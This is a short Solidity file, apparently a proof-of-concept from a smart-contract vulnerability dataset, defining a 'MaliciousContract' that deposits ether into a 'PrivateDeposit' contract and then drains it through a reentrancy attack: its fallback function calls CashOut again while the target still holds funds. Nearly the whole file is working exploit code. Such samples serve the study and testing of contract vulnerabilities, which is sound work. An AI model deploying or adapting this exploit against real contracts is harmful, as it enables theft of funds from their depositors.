pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";
import "hardhat/console.sol";

contract MaliciousContract {
    PrivateDeposit privateDeposit;
    bool attackInitiated;

    constructor(address _privateDeposit) public {
        privateDeposit = PrivateDeposit(_privateDeposit);
    }

    function attack() public payable {
        require(!attackInitiated, "Attack already initiated");
        privateDeposit.CashOut(msg.value);
        attackInitiated = true;

    }
    function deposit() public payable{
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        privateDeposit.Deposit.value(msg.value)();
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( !attackInitiated && address(privateDeposit).balance >= 1 ether) {
            privateDeposit.CashOut(1 ether);
        }
    }


}
